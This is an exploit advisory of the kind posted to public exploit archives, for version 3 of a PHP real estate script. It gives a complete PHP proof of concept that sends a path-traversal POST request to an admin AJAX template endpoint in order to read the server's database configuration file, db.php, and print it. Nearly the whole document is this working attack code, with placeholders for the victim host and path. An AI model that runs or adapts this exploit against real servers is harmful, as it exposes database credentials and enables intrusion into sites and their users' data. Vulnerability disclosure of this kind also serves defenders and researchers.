# Exploit Title: php Real Estate Script Arbitrary File Disclosure
# Date: 2016-07-08
# Exploit Author: Meisam Monsef meisamrce@yahoo.com or meisamrce@gmail.com
# Vendor Homepage: http://www.realestatescript.eu/
# Version: v.3
# Download Link : http://www.realestatescript.eu/downloads/realestatescript-v3.zip

Exploit : 
<?php
//read db config file 
$post_data = 'tpl=../../private/config/db.php';//change read file path
$host = "www.server.local";//change victim address
$socket = fsockopen($host, 80, $errno, $errstr, 15);
if(!$socket){
echo ' error: ' . $errno . ' ' . $errstr;
die;
}else{
//change [demo/en] path server
$path = "/demo/en/";
$http  = "POST {$path}admin/ajax_cms/get_template_content/ HTTP/1.1\r\n";
$http .= "Host: $host\r\n";
$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
$http .= "Content-length: " . strlen($post_data) . "\r\n";
$http .= "Connection: close\r\n\r\n";
$http .= $post_data . "\r\n\r\n";
fwrite($socket, $http);
$contents = "";
while (!feof($socket)) {
$contents .= fgets($socket, 4096);
}
fclose($socket);
$e = explode('Content-Type: text/html',$contents);
print $e[1];
}
?>
